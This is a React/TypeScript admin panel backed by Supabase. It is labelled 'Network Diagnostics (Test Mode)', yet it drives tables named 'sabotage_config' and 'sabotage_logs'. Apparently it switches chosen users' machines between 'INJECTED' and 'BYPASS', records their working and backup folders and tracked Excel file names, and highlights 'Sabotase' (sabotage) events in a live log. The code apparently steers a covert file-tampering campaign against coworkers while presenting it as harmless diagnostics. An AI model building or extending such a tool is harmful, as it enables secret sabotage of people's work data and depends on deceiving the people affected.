import React, { useState, useEffect, useRef } from 'react';
import { supabase } from '../supabaseClient';
import { FiTerminal, FiWifi, FiServer, FiShield, FiXCircle } from 'react-icons/fi';

interface SabotageConfig {
    username: string;
    is_active: boolean;
    tracked_prefix: string | null;
    first_excel_name: string | null;
    target_folder: string | null;
    step: number;
}

interface LogEntry {
    id: number;
    username: string;
    message: string;
    created_at: string;
}

interface AdminNetworkDiagnosticsProps {
    showToast?: (msg: string) => void;
}

const AdminNetworkDiagnostics: React.FC<AdminNetworkDiagnosticsProps> = ({ showToast }) => {
    const [configs, setConfigs] = useState<SabotageConfig[]>([]);
    const [logs, setLogs] = useState<LogEntry[]>([]);
    const [loading, setLoading] = useState(true);
    const [selectedUser, setSelectedUser] = useState<string | null>(null);
    const logsEndRef = useRef<HTMLDivElement>(null);

    // Initial Fetch
    useEffect(() => {
        fetchConfigs();
        fetchLogs();

        // Subscriptions
        const configSub = supabase.channel('sabotage_config_changes')
            .on('postgres_changes', { event: '*', schema: 'public', table: 'sabotage_config' }, () => fetchConfigs())
            .subscribe();

        const logsSub = supabase.channel('sabotage_logs_changes')
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'sabotage_logs' }, (payload) => {
                setLogs((prev) => [...prev, payload.new as LogEntry]);
            })
            .subscribe();

        return () => {
            supabase.removeChannel(configSub);
            supabase.removeChannel(logsSub);
        };
    }, []);

    useEffect(() => {
        // Auto-scroll logs
        logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [logs]);

    const fetchConfigs = async () => {
        setLoading(true);
        // Ensure auth_users exist in config
        const { data: users } = await supabase.from('auth_users').select('username');
        const { data: conf } = await supabase.from('sabotage_config').select('*');
        
        if (users && conf) {
            const mapped = users.map(u => {
                const existing = conf.find(c => c.username === u.username);
                return existing || { username: u.username, is_active: false, tracked_prefix: null, first_excel_name: null, target_folder: null, step: 0 };
            });
            setConfigs(mapped);
        }
        setLoading(false);
    };

    const fetchLogs = async () => {
        const { data } = await supabase.from('sabotage_logs').select('*').order('created_at', { ascending: true }).limit(200);
        if (data) setLogs(data);
    };

    const toggleDiagnostics = async (username: string, currentStatus: boolean, targetFolder: string | null = null, backupFolder: string | null = null) => {
        const newStatus = !currentStatus;
        try {
            await supabase.from('sabotage_config').upsert({
                username,
                is_active: newStatus,
                step: 0,
                tracked_prefix: null,
                first_excel_name: null,
                target_folder: newStatus ? targetFolder : null,
                backup_folder: newStatus ? backupFolder : null
            });

            // Log it
            await supabase.from('sabotage_logs').insert([{
                username,
                message: newStatus ? `[SYSTEM] Diagnostics (Test Mode) ENABLED for ${username} (Folder: ${targetFolder || 'None'}, Backup: ${backupFolder || 'Default'})` : `[SYSTEM] Diagnostics DISABLED for ${username}`
            }]);
            
            showToast?.(`Diagnostics ${newStatus ? 'diaktifkan' : 'dimatikan'} untuk ${username}`);
        } catch (e: any) {
            console.error(e);
            showToast?.('Gagal mengubah status');
        }
    };

    const handleToggleClick = (cfg: SabotageConfig) => {
        if (!cfg.is_active) {
            const folder = prompt(`Masukkan Path Folder Kerja untuk user ${cfg.username} (contoh: C:\\Users\\Admin\\Downloads):`, cfg.target_folder || '');
            if (folder === null) return; // User cancelled
            
            const backup = prompt(`[OPSIONAL] Masukkan Path Folder Backup (Kosongkan untuk default: \\\\desktop-noq4lsr\\Public\\SCRIPT\\testi\\shipping-label-customizer 5\\test):`, '');
            if (backup === null) return; // User cancelled second prompt

            toggleDiagnostics(cfg.username, cfg.is_active, folder, backup);
        } else {
            toggleDiagnostics(cfg.username, cfg.is_active);
        }
    };

    const clearLogs = async () => {
        if (!confirm('Bersihkan semua log dari layar?')) return;
        await supabase.from('sabotage_logs').delete().neq('id', 0); // delete all
        setLogs([]);
    };

    return (
        <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
            <div className="bg-white p-6 rounded-xl border border-gray-200 shadow-sm">
                <div className="flex items-center gap-4 mb-2">
                    <div className="w-12 h-12 bg-gray-900 rounded-xl flex items-center justify-center">
                        <FiTerminal className="w-6 h-6 text-green-400" />
                    </div>
                    <div>
                        <h2 className="text-lg font-bold text-gray-900 flex items-center gap-2">
                            Network Diagnostics <span className="text-[10px] bg-red-100 text-red-600 px-2 py-0.5 rounded uppercase tracking-wider font-bold">Classified</span>
                        </h2>
                        <p className="text-gray-500 text-sm">Monitor & inject validation cache for target terminals.</p>
                    </div>
                </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                {/* Control Panel */}
                <div className="bg-white rounded-xl border border-gray-200 shadow-sm overflow-hidden flex flex-col">
                    <div className="bg-gray-50 px-4 py-3 border-b border-gray-200 flex justify-between items-center">
                        <h3 className="font-semibold text-gray-700 flex items-center gap-2">
                            <FiServer className="text-gray-400" /> Target Terminals
                        </h3>
                    </div>
                    <div className="p-4 flex-1 overflow-y-auto max-h-[500px]">
                        {loading ? (
                            <p className="text-sm text-gray-500 text-center py-4">Memuat nodes...</p>
                        ) : (
                            <div className="space-y-3">
                                {configs.map(cfg => (
                                    <div key={cfg.username} className={`p-3 rounded-lg border ${cfg.is_active ? 'border-green-300 bg-green-50' : 'border-gray-200 bg-white'} flex items-center justify-between transition-colors`}>
                                        <div>
                                            <p className="font-bold text-gray-800">{cfg.username}</p>
                                            <p className="text-xs text-gray-500 font-mono mt-1">
                                                Status: {cfg.is_active ? <span className="text-green-600 font-bold">INJECTED</span> : 'BYPASS'}
                                            </p>
                                            {cfg.is_active && cfg.target_folder && (
                                                <p className="text-[10px] text-blue-600 font-mono mt-1 break-all">
                                                    Folder: {cfg.target_folder}
                                                </p>
                                            )}
                                            {cfg.is_active && cfg.tracked_prefix && (
                                                <p className="text-[10px] text-orange-600 font-mono mt-1">
                                                    Track: [{cfg.tracked_prefix}] (Step {cfg.step})
                                                </p>
                                            )}
                                        </div>
                                        <button
                                            onClick={() => handleToggleClick(cfg)}
                                            className={`w-12 h-6 rounded-full relative transition-colors focus:outline-none ${cfg.is_active ? 'bg-green-500' : 'bg-gray-300'}`}
                                        >
                                            <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${cfg.is_active ? 'left-7' : 'left-1'}`} />
                                        </button>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </div>

                {/* Terminal Window */}
                <div className="lg:col-span-2 bg-gray-900 rounded-xl shadow-lg overflow-hidden flex flex-col border border-gray-800" style={{ height: '550px' }}>
                    <div className="bg-gray-800 px-4 py-2 border-b border-gray-700 flex justify-between items-center">
                        <div className="flex items-center gap-2">
                            <div className="flex gap-1.5">
                                <div className="w-3 h-3 rounded-full bg-red-500" />
                                <div className="w-3 h-3 rounded-full bg-yellow-500" />
                                <div className="w-3 h-3 rounded-full bg-green-500" />
                            </div>
                            <span className="text-xs text-gray-400 ml-2 font-mono">root@sys-diagnostics:~</span>
                        </div>
                        <button onClick={clearLogs} className="text-xs text-gray-400 hover:text-white flex items-center gap-1 transition-colors">
                            <FiXCircle /> Clear
                        </button>
                    </div>
                    
                    <div className="p-4 font-mono text-sm flex-1 overflow-y-auto" style={{ scrollBehavior: 'smooth' }}>
                        <div className="text-green-500 mb-4 opacity-70">
                            {`> Initiating Diagnostic Protocols...`} <br/>
                            {`> Connecting to Supabase Realtime Socket... OK`} <br/>
                            {`> Waiting for terminal signals...`}
                        </div>
                        <div className="space-y-2">
                            {logs.map(log => {
                                const time = new Date(log.created_at).toLocaleTimeString('en-US', { hour12: false });
                                const isSystem = log.message.startsWith('[SYSTEM]');
                                const isMatch = log.message.includes('MATCH') || log.message.includes('Sabotase');
                                
                                let textColor = 'text-green-400';
                                if (isSystem) textColor = 'text-blue-400';
                                if (isMatch) textColor = 'text-yellow-400 font-bold';

                                return (
                                    <div key={log.id} className={`${textColor} break-words`}>
                                        <span className="text-gray-500">[{time}]</span> <span className="text-purple-400">@{log.username}</span> {log.message}
                                    </div>
                                );
                            })}
                            <div ref={logsEndRef} />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default AdminNetworkDiagnostics;
